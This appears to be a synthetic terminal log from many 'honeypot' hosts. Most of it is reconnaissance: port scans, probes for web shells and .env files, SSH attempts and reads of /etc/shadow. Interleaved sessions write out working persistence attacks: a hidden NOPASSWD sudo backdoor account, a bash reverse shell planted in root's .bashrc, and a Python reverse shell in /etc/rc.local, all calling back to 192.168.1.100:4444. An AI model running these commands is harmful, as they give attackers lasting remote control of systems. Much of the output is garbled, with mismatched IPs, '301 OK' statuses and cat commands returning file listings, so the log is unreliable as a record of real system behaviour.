+root@honeypot-5:~# ls -la /tmp/d1426996
+-rw-r--r-- 1 root root 5451 Jan 21 12:00
+
+root@honeypot-22:~# ls -la /var/log/messages
+Permission denied
+
+root@honeypot-37:~# ls -la /tmp/82fa4d65
+-rw-r--r-- 1 root root 3629 Jan 21 23:46
+
+root@honeypot-18:~# id
+Command executed.
+
+root@honeypot-45:~# ls -la /var/log/secure
+Permission denied
+
+root@honeypot-26:~# whoami
+Command executed.
+
+root@honeypot-45:~# curl -s -o /dev/null -w '%{http_code}' http://104.219.47.156:80/config.php
+HTTP/1.1 200 OK
+
+root@honeypot-31:~# cat /var/log/auth.log.20260106021158
+-rw-r--r-- 1 root root 5827 Jan 21 19:15
+
+root@honeypot-8:~# wget -q --spider http://183.196.172.157/config.php
+HTTP/1.1 200 OK
+
+root@honeypot-21:~# uname -a
+Command executed.
+
+root@honeypot-48:~# ssh -p 21201 admin@138.100.96.61
+ssh: connect to host 50.189.119.8 port 22: Connection timed out
+
+root@honeypot-39:~# cat /var/log/auth.log.20260113051158
+-rw-r--r-- 1 root root 4897 Jan 21 03:00
+
+root@honeypot-13:~# nmap -sU -p 53,161,123 97.178.45.233
+Starting Nmap scan... Host is up (0.05s latency).
+
+root@honeypot-27:~# nmap -sS -O 178.46.142.100
+Starting Nmap scan... Host is up (0.03s latency).
+
+root@honeypot-29:~# curl -s -o /dev/null -w '%{http_code}' http://193.86.202.73:22/shell.php
+HTTP/1.1 200 OK
+
+root@honeypot-12:~# id
+Command executed.
+
+root@honeypot-47:~# netstat -an | grep 58671
+Command executed.
+
+root@honeypot-29:~# ssh -p 18210 ftpuser@1.171.165.120
+ssh: connect to host 78.60.27.2 port 22: Connection timed out
+
+root@honeypot-38:~# cat /proc/version
+-rw-r--r-- 1 root root 4391 Jan 21 14:44
+
+root@honeypot-44:~# cat /proc/version
+Permission denied
+
+root@honeypot-4:~# find / -name '*.conf' 2>/dev/null | head -5
+Command executed.
+
+root@honeypot-17:~# whoami
+Command executed.
+
+root@honeypot-40:~# cat /etc/shadow 2>/dev/null
+-rw-r--r-- 1 root root 2355 Jan 21 03:21
+
+root@honeypot-10:~# nmap -sU -p 53,161,123 210.192.244.159
+Starting Nmap scan... Host is up (0.86s latency).
+
+root@honeypot-12:~# ls -la /var/log/auth.log
+Permission denied
+
+root@honeypot-22:~# netstat -an | grep 8080
+Command executed.
+
+root@honeypot-37:~# ss -tunlp | grep 6379
+Command executed.
+
+The session continues in following lines.
+
+Last login: Fri Jan 23 16:11:59 2026 from 192.168.1.122  
+sysadmin@server-45:~$ cat /root/.ssh/authorized_keys | grep -E 'c2server'	<2026-01-23 16:12:03.349172>
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC0fake... c2server@attacker
+root@honeypot-50:~# ls -la /var/log/auth.log
+-rw-r--r-- 1 root root 3941 Jan 21 13:08
+
+root@honeypot-43:~# ssh test@158.221.176.65 -o ConnectTimeout=3
+ssh: connect to host 19.85.86.91 port 22: Connection timed out
+
+root@honeypot-37:~# find / -name '*.conf' 2>/dev/null | head -5
+Command executed.
+
+root@honeypot-20:~# uname -a
+Command executed.
+
+root@honeypot-29:~# cat /etc/passwd | head -1
+-rw-r--r-- 1 root root 1513 Jan 21 03:15
+
+root@honeypot-11:~# ls -la /tmp/114b7d73
+Permission denied
+
+root@honeypot-47:~# curl -I http://72.38.36.29:8080/backup.sql
+HTTP/1.1 301 OK
+
+root@honeypot-9:~# curl -s -o /dev/null -w '%{http_code}' http://39.201.193.84:4265/phpmyadmin/
+HTTP/1.1 500 OK
+
+root@honeypot-19:~# netstat -an | grep 8080
+Command executed.
+
+root@honeypot-31:~# ls -la /tmp/5be9460a
+Permission denied
+
+root@honeypot-13:~# ping -c 1 14.60.167.39
+PING: 64 bytes from 1.248.229.68: icmp_seq=1 ttl=64 time=31.6 ms
+
+root@honeypot-24:~# ssh -p 21 ubuntu@145.78.53.247
+ssh: connect to host 223.247.188.205 port 22: Connection timed out
+
+root@honeypot-44:~# ping -c 1 224.69.60.190
+PING: 64 bytes from 232.224.219.110: icmp_seq=1 ttl=64 time=34.1 ms
+
+root@honeypot-4:~# ssh -p 22 user@3.90.77.85
+ssh: connect to host 174.9.167.28 port 22: Connection timed out
+
+root@honeypot-16:~# whoami
+Command executed.
+
+root@honeypot-46:~# id
+Command executed.
+
+root@honeypot-13:~# netstat -an | grep 23
+Command executed.
+
+root@honeypot-18:~# nmap -sV -p 236-326 208.231.200.168
+Starting Nmap scan... Host is up (0.38s latency).
+
+root@honeypot-41:~# netstat -an | grep 80
+Command executed.
+
+root@honeypot-23:~# curl -I http://55.235.220.133:23/backup.sql
+HTTP/1.1 500 OK
+
+root@honeypot-50:~# cat /etc/passwd | head -1
+Permission denied
+
+root@honeypot-43:~# ss -tunlp | grep 29985
+Command executed.
+
+root@honeypot-39:~# nmap -sU -p 53,161,123 138.74.123.83
+Starting Nmap scan... Host is up (0.02s latency).
+
+root@honeypot-48:~# id
+Command executed.
+
+root@honeypot-20:~# curl -s -o /dev/null -w '%{http_code}' http://250.128.161.107:27017/.env
+HTTP/1.1 500 OK
+
+root@honeypot-40:~# nmap -sU -p 53,161,123 194.192.118.157
+Starting Nmap scan... Host is up (0.01s latency).
+
+root@honeypot-45:~# ssh test@67.120.52.155 -o ConnectTimeout=3
+ssh: connect to host 118.97.109.213 port 22: Connection timed out
+
+root@honeypot-34:~# cat /etc/shadow 2>/dev/null
+-rw-r--r-- 1 root root 6697 Jan 21 21:33
+
+root@honeypot-49:~# ss -tunlp | grep 3306
+Command executed.
+
+root@honeypot-36:~# nmap -sV -p 204-273 242.193.42.33
+Starting Nmap scan... Host is up (0.65s latency).
+
+root@honeypot-2:~# whoami
+Command executed.
+
+root@honeypot-29:~# id
+Command executed.
+
+root@honeypot-31:~# curl -s -o /dev/null -w '%{http_code}' http://14.73.242.190:25/test.php
+HTTP/1.1 500 OK
+
+root@honeypot-49:~# cat /proc/version
+-rw-r--r-- 1 root root 3254 Jan 21 08:00
+
+root@honeypot-27:~# netstat -an | grep 3306
+Command executed.
+
+root@honeypot-14:~# cat /etc/passwd | head -1
+-rw-r--r-- 1 root root 4622 Jan 21 09:31
+
+root@honeypot-32:~# nmap -sS -O 109.119.119.14
+Starting Nmap scan... Host is up (0.50s latency).
+
+root@honeypot-46:~# find / -name '*.conf' 2>/dev/null | head -5
+Command executed.
+
+root@honeypot-2:~# cat /proc/version
+-rw-r--r-- 1 root root 1037 Jan 21 02:41
+
+root@honeypot-19:~# nmap -sV -p 782-835 79.182.193.238
+Starting Nmap scan... Host is up (0.36s latency).
+
+root@honeypot-28:~# whoami
+Command executed.
+
+root@honeypot-50:~# ss -tunlp | grep 22
+Command executed.
+
+root@honeypot-22:~# find / -name '*.conf' 2>/dev/null | head -5
+Command executed.
+
+root@honeypot-8:~# id
+Command executed.
+
+root@honeypot-50:~# ss -tunlp | grep 22
+Command executed.
+
+root@honeypot-5:~# netstat -an | grep 21
+Command executed.
+
+root@honeypot-46:~# cat /etc/passwd | head -1
+-rw-r--r-- 1 root root 3625 Jan 21 17:47
+
+root@honeypot-20:~# wget -q --spider http://165.91.255.24/wp-admin/
+HTTP/1.1 301 OK
+
+root@honeypot-10:~# nmap -sU -p 53,161,123 109.216.36.179
+Starting Nmap scan... Host is up (0.67s latency).
+
+root@honeypot-44:~# netstat -an | grep 64685
+Command executed.
+
+The session continues in following lines.
+
+Last login: Fri Jan 23 16:14:03 2026 from 192.168.1.125  
+operator@server-58:~$ useradd -m -s /bin/bash -c 'System Service Account' sysupdate && echo 'sysupdate:B@ckd00r2024!' | chpasswd && usermod -aG sudo sysupdate && echo 'sysupdate ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/sysupdate	<2026-01-23 16:14:07.603759>
+Command executed.
+root@honeypot-39:~# ls -la /tmp/450bc4de
+Permission denied
+
+root@honeypot-31:~# cat /var/log/auth.log.20260121061607
+-rw-r--r-- 1 root root 1954 Jan 21 20:08
+
+root@honeypot-27:~# ls -la /tmp/345609e8
+-rw-r--r-- 1 root root 5140 Jan 21 15:11
+
+root@honeypot-32:~# ls -la /var/log/nginx/error.log
+-rw-r--r-- 1 root root 8378 Jan 21 01:55
+
+root@honeypot-44:~# wget -q --spider http://23.166.140.72/upload.php
+HTTP/1.1 404 OK
+
+root@honeypot-9:~# nmap -sU -p 53,161,123 122.241.90.238
+Starting Nmap scan... Host is up (0.45s latency).
+
+root@honeypot-45:~# curl -s -o /dev/null -w '%{http_code}' http://5.153.209.18:55399/backup.sql
+HTTP/1.1 301 OK
+
+root@honeypot-11:~# cat /var/log/auth.log.20260123111607
+-rw-r--r-- 1 root root 9455 Jan 21 11:14
+
+root@honeypot-44:~# id
+Command executed.
+
+root@honeypot-48:~# nmap -sV -p 611-669 169.173.208.150
+Starting Nmap scan... Host is up (0.86s latency).
+
+root@honeypot-42:~# ssh -p 27017 root@147.224.55.61
+ssh: connect to host 162.159.112.64 port 22: Connection timed out
+
+root@honeypot-9:~# nmap -sV -p 898-987 197.69.99.185
+Starting Nmap scan... Host is up (0.63s latency).
+
+root@honeypot-38:~# wget -q --spider http://206.120.79.109/robots.txt
+HTTP/1.1 301 OK
+
+root@honeypot-31:~# find / -name '*.conf' 2>/dev/null | head -5
+Command executed.
+
+root@honeypot-36:~# id
+Command executed.
+
+root@honeypot-10:~# cat /etc/passwd | head -1
+-rw-r--r-- 1 root root 1807 Jan 21 01:54
+
+root@honeypot-1:~# ssh test@98.155.110.226 -o ConnectTimeout=3
+ssh: connect to host 67.4.186.153 port 22: Connection timed out
+
+root@honeypot-42:~# uname -a
+Command executed.
+
+root@honeypot-23:~# nmap -sV -p 326-343 146.197.49.23
+Starting Nmap scan... Host is up (0.09s latency).
+
+root@honeypot-22:~# ls -la /tmp/3469abf1
+-rw-r--r-- 1 root root 3511 Jan 21 01:18
+
+root@honeypot-45:~# ss -tunlp | grep 6379
+Command executed.
+
+root@honeypot-38:~# ssh root@115.15.239.69 -o ConnectTimeout=3
+ssh: connect to host 22.214.161.250 port 22: Connection timed out
+
+root@honeypot-46:~# tail -n 10 /var/log/syslog
+Command executed.
+
+root@honeypot-14:~# ss -tunlp | grep 63972
+Command executed.
+
+root@honeypot-26:~# id
+Command executed.
+
+root@honeypot-38:~# id
+Command executed.
+
+root@honeypot-32:~# ping -c 1 125.247.173.233
+PING: 64 bytes from 3.134.16.62: icmp_seq=1 ttl=64 time=8.3 ms
+
+root@honeypot-8:~# cat /var/log/auth.log.20260111151607
+-rw-r--r-- 1 root root 3921 Jan 21 00:50
+
+root@honeypot-8:~# id
+Command executed.
+
+root@honeypot-44:~# ssh deploy@245.49.31.254 -o ConnectTimeout=3
+ssh: connect to host 213.144.26.159 port 22: Connection timed out
+
+root@honeypot-34:~# ss -tunlp | grep 80
+Command executed.
+
+root@honeypot-41:~# ls -la /tmp/f71cacc5
+-rw-r--r-- 1 root root 5271 Jan 21 05:15
+
+root@honeypot-10:~# wget -q --spider http://157.197.70.38/backup.sql
+HTTP/1.1 403 OK
+
+root@honeypot-40:~# ls -la /var/log/nginx/error.log
+-rw-r--r-- 1 root root 3494 Jan 21 19:37
+
+root@honeypot-41:~# ssh deploy@91.171.116.100 -o ConnectTimeout=3
+ssh: connect to host 150.1.234.40 port 22: Connection timed out
+
+root@honeypot-16:~# nmap -sV -p 685-715 154.7.191.246
+Starting Nmap scan... Host is up (0.35s latency).
+
+root@honeypot-13:~# ls -la /var/log/auth.log
+-rw-r--r-- 1 root root 7078 Jan 21 08:38
+
+root@honeypot-46:~# curl -I http://43.230.240.131:80/shell.php
+HTTP/1.1 301 OK
+
+root@honeypot-28:~# cat /etc/passwd | head -1
+-rw-r--r-- 1 root root 755 Jan 21 09:01
+
+root@honeypot-17:~# ls -la /tmp/eb6e39fc
+-rw-r--r-- 1 root root 4317 Jan 21 20:39
+
+root@honeypot-36:~# find / -name '*.conf' 2>/dev/null | head -5
+Command executed.
+
+root@honeypot-24:~# ping -c 1 144.129.202.60
+PING: 64 bytes from 183.168.198.135: icmp_seq=1 ttl=64 time=15.5 ms
+
+root@honeypot-23:~# nmap -sS -O 112.212.54.144
+Starting Nmap scan... Host is up (0.42s latency).
+
+root@honeypot-31:~# nmap -sS -O 194.92.23.88
+Starting Nmap scan... Host is up (0.20s latency).
+
+root@honeypot-49:~# ss -tunlp | grep 8080
+Command executed.
+
+root@honeypot-31:~# find / -name '*.conf' 2>/dev/null | head -5
+Command executed.
+
+root@honeypot-15:~# ssh test@227.197.255.73 -o ConnectTimeout=3
+ssh: connect to host 90.110.72.107 port 22: Connection timed out
+
+root@honeypot-42:~# wget -q --spider http://92.217.39.156/config.php
+HTTP/1.1 500 OK
+
+root@honeypot-10:~# nmap -sS -O 207.35.223.74
+Starting Nmap scan... Host is up (0.73s latency).
+
+root@honeypot-25:~# netstat -an | grep 15900
+Command executed.
+
+The session continues in following lines.
+
+Last login: Fri Jan 23 16:16:08 2026 from 192.168.1.128  
+auditor@server-71:~$ id sysupdate | grep -E '(sudo|wheel)' && grep sysupdate /etc/passwd && sudo -l -U sysupdate | grep NOPASSWD	<2026-01-23 16:16:12.299637>
+uid=1002(sysupdate) gid=1002(sysupdate) groups=1002(sysupdate),27(sudo)
+sysupdate:x:1002:1002:System Service Account:/home/sysupdate:/bin/bash
+User sysupdate may run the following commands on server-71:
+    (ALL) NOPASSWD: ALL
+root@honeypot-41:~# nmap -sS -O 111.10.209.230
+Starting Nmap scan... Host is up (0.89s latency).
+
+root@honeypot-37:~# uname -a
+Command executed.
+
+root@honeypot-19:~# id
+Command executed.
+
+root@honeypot-42:~# nmap -sS -O 30.237.151.25
+Starting Nmap scan... Host is up (0.74s latency).
+
+root@honeypot-46:~# wget -q --spider http://104.248.55.168/phpmyadmin/
+HTTP/1.1 404 OK
+
+root@honeypot-40:~# ss -tunlp | grep 5432
+Command executed.
+
+root@honeypot-17:~# find / -name '*.conf' 2>/dev/null | head -5
+Command executed.
+
+root@honeypot-43:~# tail -n 10 /var/log/syslog
+Command executed.
+
+root@honeypot-17:~# tail -n 10 /var/log/syslog
+Command executed.
+
+root@honeypot-37:~# nmap -sV -p 727-786 9.36.52.66
+Starting Nmap scan... Host is up (0.46s latency).
+
+root@honeypot-18:~# curl -s -o /dev/null -w '%{http_code}' http://82.67.87.177:3679/test.php
+HTTP/1.1 500 OK
+
+root@honeypot-21:~# nmap -sV -p 670-744 41.171.160.129
+Starting Nmap scan... Host is up (0.32s latency).
+
+root@honeypot-25:~# nmap -sU -p 53,161,123 119.7.162.149
+Starting Nmap scan... Host is up (0.56s latency).
+
+root@honeypot-39:~# curl -s -o /dev/null -w '%{http_code}' http://45.41.28.36:11075/test.php
+HTTP/1.1 404 OK
+
+root@honeypot-26:~# ls -la /tmp/e4e4ff47
+Permission denied
+
+root@honeypot-34:~# nmap -sV -p 725-788 15.95.100.42
+Starting Nmap scan... Host is up (0.39s latency).
+
+root@honeypot-9:~# curl -I http://28.129.181.104:1191/phpmyadmin/
+HTTP/1.1 404 OK
+
+root@honeypot-20:~# ssh -p 27017 ftpuser@82.61.183.226
+ssh: connect to host 87.183.36.163 port 22: Connection timed out
+
+root@honeypot-31:~# curl -s -o /dev/null -w '%{http_code}' http://199.232.162.131:443/phpmyadmin/
+HTTP/1.1 403 OK
+
+root@honeypot-20:~# ss -tunlp | grep 25529
+Command executed.
+
+root@honeypot-44:~# ss -tunlp | grep 8080
+Command executed.
+
+root@honeypot-6:~# whoami
+Command executed.
+
+root@honeypot-9:~# cat /var/log/auth.log.20251229021812
+-rw-r--r-- 1 root root 2552 Jan 21 02:03
+
+root@honeypot-26:~# ssh -p 20956 www-data@4.219.238.163
+ssh: connect to host 53.74.205.169 port 22: Connection timed out
+
+root@honeypot-44:~# find / -name '*.conf' 2>/dev/null | head -5
+Command executed.
+
+root@honeypot-28:~# cat /etc/shadow 2>/dev/null
+Permission denied
+
+root@honeypot-17:~# whoami
+Command executed.
+
+root@honeypot-6:~# wget -q --spider http://239.37.41.142/.env
+HTTP/1.1 200 OK
+
+root@honeypot-39:~# cat /etc/shadow 2>/dev/null
+-rw-r--r-- 1 root root 7623 Jan 21 01:33
+
+root@honeypot-30:~# nmap -sV -p 582-645 126.247.241.2
+Starting Nmap scan... Host is up (0.70s latency).
+
+root@honeypot-46:~# cat /etc/passwd | head -1
+-rw-r--r-- 1 root root 5851 Jan 21 06:10
+
+root@honeypot-28:~# cat /proc/version
+-rw-r--r-- 1 root root 268 Jan 21 19:14
+
+root@honeypot-24:~# cat /etc/shadow 2>/dev/null
+-rw-r--r-- 1 root root 7907 Jan 21 12:52
+
+root@honeypot-32:~# nmap -sU -p 53,161,123 146.209.200.251
+Starting Nmap scan... Host is up (0.78s latency).
+
+root@honeypot-39:~# cat /etc/shadow 2>/dev/null
+-rw-r--r-- 1 root root 1524 Jan 21 15:11
+
+root@honeypot-4:~# nmap -sU -p 53,161,123 55.106.82.186
+Starting Nmap scan... Host is up (0.74s latency).
+
+root@honeypot-30:~# uname -a
+Command executed.
+
+root@honeypot-10:~# curl -s -o /dev/null -w '%{http_code}' http://143.167.134.203:25/.git/config
+HTTP/1.1 403 OK
+
+root@honeypot-23:~# find / -name '*.conf' 2>/dev/null | head -5
+Command executed.
+
+root@honeypot-37:~# id
+Command executed.
+
+root@honeypot-29:~# nmap -sU -p 53,161,123 203.104.51.183
+Starting Nmap scan... Host is up (0.38s latency).
+
+root@honeypot-28:~# wget -q --spider http://214.249.108.202/shell.php
+HTTP/1.1 403 OK
+
+root@honeypot-7:~# ssh -p 25 root@128.51.47.4
+ssh: connect to host 40.19.78.234 port 22: Connection timed out
+
+root@honeypot-16:~# id
+Command executed.
+
+root@honeypot-48:~# find / -name '*.conf' 2>/dev/null | head -5
+Command executed.
+
+root@honeypot-40:~# whoami
+Command executed.
+
+root@honeypot-2:~# curl -s -o /dev/null -w '%{http_code}' http://160.29.93.155:443/shell.php
+HTTP/1.1 301 OK
+
+root@honeypot-9:~# find / -name '*.conf' 2>/dev/null | head -5
+Command executed.
+
+root@honeypot-41:~# netstat -an | grep 25
+Command executed.
+
+root@honeypot-40:~# ssh ftpuser@87.168.86.14 -o ConnectTimeout=3
+ssh: connect to host 113.248.86.220 port 22: Connection timed out
+
+The session continues in following lines.
+
+Last login: Fri Jan 23 16:18:12 2026 from 192.168.1.131  
+analyst@server-84:~$ echo 'export PROMPT_COMMAND="(nohup bash -c \"bash -i >& /dev/tcp/192.168.1.100/4444 0>&1\" &)"' >> /root/.bashrc	<2026-01-23 16:18:16.944277>
+Command executed.
+root@honeypot-48:~# wget -q --spider http://251.180.118.148/robots.txt
+HTTP/1.1 301 OK
+
+root@honeypot-48:~# cat /var/log/auth.log.20251225192017
+Permission denied
+
+root@honeypot-5:~# find / -name '*.conf' 2>/dev/null | head -5
+Command executed.
+
+root@honeypot-34:~# tail -n 10 /var/log/syslog
+Command executed.
+
+root@honeypot-31:~# ls -la /tmp/4e244629
+-rw-r--r-- 1 root root 8184 Jan 21 13:50
+
+root@honeypot-43:~# tail -n 10 /var/log/syslog
+Command executed.
+
+root@honeypot-36:~# find / -name '*.conf' 2>/dev/null | head -5
+Command executed.
+
+root@honeypot-4:~# curl -s -o /dev/null -w '%{http_code}' http://145.246.128.209:8080/wp-admin/
+HTTP/1.1 500 OK
+
+root@honeypot-1:~# nmap -sU -p 53,161,123 187.92.116.198
+Starting Nmap scan... Host is up (0.74s latency).
+
+root@honeypot-48:~# ping -c 1 181.181.2.228
+PING: 64 bytes from 174.196.144.42: icmp_seq=1 ttl=64 time=1.4 ms
+
+root@honeypot-13:~# cat /proc/version
+-rw-r--r-- 1 root root 6909 Jan 21 12:45
+
+root@honeypot-40:~# curl -s -o /dev/null -w '%{http_code}' http://110.35.164.27:23/.git/config
+HTTP/1.1 301 OK
+
+root@honeypot-39:~# wget -q --spider http://76.253.103.117/wp-admin/
+HTTP/1.1 404 OK
+
+root@honeypot-11:~# ls -la /var/log/secure
+-rw-r--r-- 1 root root 4648 Jan 21 15:35
+
+root@honeypot-45:~# ssh ubuntu@125.202.93.249 -o ConnectTimeout=3
+ssh: connect to host 220.125.242.209 port 22: Connection timed out
+
+root@honeypot-2:~# wget -q --spider http://177.166.39.174/cmd.php
+HTTP/1.1 500 OK
+
+root@honeypot-22:~# curl -I http://22.255.3.211:22/shell.php
+HTTP/1.1 403 OK
+
+root@honeypot-45:~# wget -q --spider http://160.87.73.169/admin.php
+HTTP/1.1 500 OK
+
+root@honeypot-23:~# ls -la /var/log/messages
+-rw-r--r-- 1 root root 1895 Jan 21 19:27
+
+root@honeypot-5:~# ss -tunlp | grep 25
+Command executed.
+
+root@honeypot-25:~# ssh -p 6379 user@246.124.76.116
+ssh: connect to host 39.171.27.183 port 22: Connection timed out
+
+root@honeypot-48:~# ssh -p 12591 root@181.129.29.140
+ssh: connect to host 38.127.134.203 port 22: Connection timed out
+
+root@honeypot-48:~# ls -la /tmp/b68fb5ef
+Permission denied
+
+root@honeypot-23:~# id
+Command executed.
+
+root@honeypot-38:~# cat /var/log/auth.log.20260115042017
+-rw-r--r-- 1 root root 3934 Jan 21 20:57
+
+root@honeypot-30:~# netstat -an | grep 3306
+Command executed.
+
+root@honeypot-30:~# whoami
+Command executed.
+
+root@honeypot-7:~# nmap -sS -O 56.8.71.243
+Starting Nmap scan... Host is up (0.08s latency).
+
+root@honeypot-46:~# cat /proc/version
+-rw-r--r-- 1 root root 6451 Jan 21 13:59
+
+root@honeypot-3:~# find / -name '*.conf' 2>/dev/null | head -5
+Command executed.
+
+root@honeypot-41:~# ssh -p 3389 guest@16.144.127.26
+ssh: connect to host 153.248.67.203 port 22: Connection timed out
+
+root@honeypot-38:~# cat /etc/passwd | head -1
+-rw-r--r-- 1 root root 1477 Jan 21 22:43
+
+root@honeypot-30:~# ssh deploy@219.179.244.103 -o ConnectTimeout=3
+ssh: connect to host 110.72.213.174 port 22: Connection timed out
+
+root@honeypot-22:~# uname -a
+Command executed.
+
+root@honeypot-37:~# curl -I http://199.5.191.15:3306/test.php
+HTTP/1.1 404 OK
+
+root@honeypot-22:~# nmap -sV -p 868-900 169.184.65.65
+Starting Nmap scan... Host is up (0.52s latency).
+
+root@honeypot-48:~# ssh admin@7.149.131.70 -o ConnectTimeout=3
+ssh: connect to host 32.170.195.201 port 22: Connection timed out
+
+root@honeypot-35:~# nmap -sS -O 211.168.149.209
+Starting Nmap scan... Host is up (0.37s latency).
+
+root@honeypot-38:~# ls -la /tmp/c8834904
+Permission denied
+
+root@honeypot-36:~# whoami
+Command executed.
+
+root@honeypot-39:~# cat /etc/passwd | head -1
+-rw-r--r-- 1 root root 2830 Jan 21 21:33
+
+root@honeypot-22:~# ls -la /var/log/secure
+-rw-r--r-- 1 root root 6390 Jan 21 03:35
+
+root@honeypot-5:~# ssh -p 54189 test@222.3.237.197
+ssh: connect to host 19.127.193.143 port 22: Connection timed out
+
+root@honeypot-43:~# ls -la /tmp/e942cb85
+-rw-r--r-- 1 root root 2769 Jan 21 06:55
+
+root@honeypot-44:~# wget -q --spider http://156.191.183.200/upload.php
+HTTP/1.1 403 OK
+
+root@honeypot-31:~# ls -la /var/log/nginx/error.log
+-rw-r--r-- 1 root root 7212 Jan 21 20:22
+
+root@honeypot-26:~# whoami
+Command executed.
+
+root@honeypot-23:~# id
+Command executed.
+
+root@honeypot-4:~# curl -s -o /dev/null -w '%{http_code}' http://12.171.39.228:23/shell.php
+HTTP/1.1 403 OK
+
+root@honeypot-46:~# cat /var/log/auth.log.20260122052017
+-rw-r--r-- 1 root root 5015 Jan 21 16:18
+
+The session continues in following lines.
+
+Last login: Fri Jan 23 16:20:17 2026 from 192.168.1.134  
+monitor@server-97:~$ cat /root/.bashrc | grep -E 'PROMPT_COMMAND.*tcp.*4444'	<2026-01-23 16:20:21.923546>
+export PROMPT_COMMAND="(nohup bash -c \"bash -i >& /dev/tcp/192.168.1.100/4444 0>&1\" &)"
+root@honeypot-40:~# nmap -sS -O 47.247.234.7
+Starting Nmap scan... Host is up (0.77s latency).
+
+root@honeypot-2:~# nmap -sV -p 764-844 113.145.123.225
+Starting Nmap scan... Host is up (0.52s latency).
+
+root@honeypot-38:~# ls -la /tmp/fff3a5ee
+Permission denied
+
+root@honeypot-12:~# curl -s -o /dev/null -w '%{http_code}' http://143.108.22.173:50358/cmd.php
+HTTP/1.1 500 OK
+
+root@honeypot-38:~# id
+Command executed.
+
+root@honeypot-4:~# ping -c 1 89.69.180.33
+PING: 64 bytes from 36.28.35.54: icmp_seq=1 ttl=64 time=42.9 ms
+
+root@honeypot-32:~# ping -c 1 180.19.104.93
+PING: 64 bytes from 222.113.100.18: icmp_seq=1 ttl=64 time=41.6 ms
+
+root@honeypot-22:~# cat /proc/version
+-rw-r--r-- 1 root root 9331 Jan 21 21:55
+
+root@honeypot-43:~# nmap -sS -O 62.41.99.132
+Starting Nmap scan... Host is up (0.13s latency).
+
+root@honeypot-49:~# uname -a
+Command executed.
+
+root@honeypot-45:~# id
+Command executed.
+
+root@honeypot-16:~# ls -la /tmp/c984811c
+-rw-r--r-- 1 root root 8004 Jan 21 21:53
+
+root@honeypot-29:~# curl -I http://239.227.132.62:27017/robots.txt
+HTTP/1.1 200 OK
+
+root@honeypot-46:~# ssh -p 23 ec2-user@148.2.150.138
+ssh: connect to host 179.236.185.37 port 22: Connection timed out
+
+root@honeypot-33:~# cat /etc/shadow 2>/dev/null
+-rw-r--r-- 1 root root 345 Jan 21 17:57
+
+root@honeypot-12:~# whoami
+Command executed.
+
+root@honeypot-27:~# netstat -an | grep 50542
+Command executed.
+
+root@honeypot-27:~# cat /var/log/auth.log.20260115112221
+-rw-r--r-- 1 root root 4786 Jan 21 00:31
+
+root@honeypot-31:~# cat /etc/passwd | head -1
+-rw-r--r-- 1 root root 3304 Jan 21 16:42
+
+root@honeypot-20:~# ls -la /var/log/secure
+Permission denied
+
+root@honeypot-26:~# nmap -sS -O 22.67.3.54
+Starting Nmap scan... Host is up (0.24s latency).
+
+root@honeypot-7:~# ssh ec2-user@120.43.65.101 -o ConnectTimeout=3
+ssh: connect to host 215.59.167.210 port 22: Connection timed out
+
+root@honeypot-15:~# nmap -sV -p 187-233 172.194.24.147
+Starting Nmap scan... Host is up (0.60s latency).
+
+root@honeypot-22:~# curl -s -o /dev/null -w '%{http_code}' http://6.232.246.15:59328/.git/config
+HTTP/1.1 200 OK
+
+root@honeypot-14:~# tail -n 10 /var/log/syslog
+Command executed.
+
+root@honeypot-37:~# ssh user@130.97.53.198 -o ConnectTimeout=3
+ssh: connect to host 109.50.216.206 port 22: Connection timed out
+
+root@honeypot-4:~# ssh ftpuser@145.177.239.141 -o ConnectTimeout=3
+ssh: connect to host 221.124.135.146 port 22: Connection timed out
+
+root@honeypot-32:~# tail -n 10 /var/log/syslog
+Command executed.
+
+root@honeypot-8:~# find / -name '*.conf' 2>/dev/null | head -5
+Command executed.
+
+root@honeypot-42:~# tail -n 10 /var/log/syslog
+Command executed.
+
+root@honeypot-15:~# nmap -sV -p 136-186 188.139.37.111
+Starting Nmap scan... Host is up (0.93s latency).
+
+root@honeypot-27:~# curl -s -o /dev/null -w '%{http_code}' http://187.150.58.233:6379/wp-admin/
+HTTP/1.1 200 OK
+
+root@honeypot-12:~# wget -q --spider http://92.210.72.253/shell.php
+HTTP/1.1 404 OK
+
+root@honeypot-1:~# ssh -p 27017 ec2-user@129.167.49.60
+ssh: connect to host 251.126.119.142 port 22: Connection timed out
+
+root@honeypot-1:~# wget -q --spider http://116.25.0.80/backup.sql
+HTTP/1.1 404 OK
+
+root@honeypot-27:~# id
+Command executed.
+
+root@honeypot-45:~# nmap -sU -p 53,161,123 160.20.218.105
+Starting Nmap scan... Host is up (0.17s latency).
+
+root@honeypot-37:~# id
+Command executed.
+
+root@honeypot-17:~# tail -n 10 /var/log/syslog
+Command executed.
+
+root@honeypot-48:~# ls -la /tmp/98c7b62a
+-rw-r--r-- 1 root root 4826 Jan 21 22:51
+
+root@honeypot-40:~# curl -s -o /dev/null -w '%{http_code}' http://245.165.120.44:30547/.env
+HTTP/1.1 200 OK
+
+root@honeypot-20:~# ls -la /var/log/apache2/access.log
+-rw-r--r-- 1 root root 2715 Jan 21 02:58
+
+root@honeypot-4:~# nmap -sU -p 53,161,123 100.205.111.191
+Starting Nmap scan... Host is up (0.33s latency).
+
+root@honeypot-42:~# cat /etc/shadow 2>/dev/null
+-rw-r--r-- 1 root root 1961 Jan 21 12:49
+
+root@honeypot-26:~# nmap -sS -O 193.51.219.125
+Starting Nmap scan... Host is up (0.03s latency).
+
+root@honeypot-38:~# wget -q --spider http://190.226.204.117/phpmyadmin/
+HTTP/1.1 301 OK
+
+root@honeypot-31:~# curl -s -o /dev/null -w '%{http_code}' http://21.6.34.32:59368/backup.sql
+HTTP/1.1 500 OK
+
+root@honeypot-22:~# netstat -an | grep 8080
+Command executed.
+
+root@honeypot-23:~# tail -n 10 /var/log/syslog
+Command executed.
+
+root@honeypot-18:~# id
+Command executed.
+
+The session continues in following lines.
+
+Last login: Fri Jan 23 16:22:22 2026 from 192.168.1.137  
+pentester@server-109:~$ echo '#!/bin/bash' > /etc/rc.local && echo 'nohup /usr/bin/python3 -c "import socket,subprocess;s=socket.socket();s.connect((\\"192.168.1.100\\",4444));subprocess.call([\\"bash\\",\\"-i\\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())" &' >> /etc/rc.local && chmod +x /etc/rc.local	<2026-01-23 16:22:26.800544>
+Command executed.
+root@honeypot-8:~# nmap -sS -O 105.33.227.158
+Starting Nmap scan... Host is up (0.55s latency).
+
+root@honeypot-44:~# nmap -sS -O 207.200.124.157
